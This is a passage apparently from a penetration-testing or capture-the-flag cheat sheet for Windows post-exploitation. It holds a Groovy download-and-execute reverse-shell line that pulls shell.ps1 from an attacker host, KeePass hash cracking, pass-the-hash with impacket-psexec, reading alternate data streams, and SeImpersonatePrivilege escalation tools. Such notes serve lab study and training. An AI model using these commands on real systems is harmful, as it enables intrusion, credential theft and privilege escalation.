...
```groovy
Thread.start {
  def cmd = """cmd.exe /c powershell IEX(New-Object Net.WebClient).downloadString('http://<KALI>/shell.ps1')"""
  cmd.execute()
}
```
Prep Nishang shell on Kali first:
```bash
...
Look for `.kdbx` files in user Documents:
```bash
keepass2john file.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
kpcli --kdb file.kdbx   # open with cracked password
```
KeePass entries may contain NTLM hashes instead of plaintext passwords - use for pass-the-hash.

#### Pass-the-Hash
Having the NTLM hash = having the password. No cracking needed.
```bash
impacket-psexec administrator@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
# Gives SYSTEM shell
```

#### Alternate Data Streams (ADS) - Hidden Flags
When a file says "look deeper" or flag seems missing:
```cmd
dir /R C:\path\to\directory        # Reveals hidden streams
more < file.txt:hidden:$DATA       # Reads the hidden stream
```
`type` cannot read ADS - must use `more <` with the stream path.

#### SeImpersonatePrivilege to SYSTEM
Check with `whoami /priv`. If SeImpersonatePrivilege is Enabled:
- **JuicyPotato** (Windows 10 build 10586 and earlier, Server 2016)
- **PrintSpoofer** (Windows 10, Server 2019)
- **RoguePotato** (fallback when JuicyPotato is blocked)
Common on service accounts (Jenkins, IIS, MSSQL).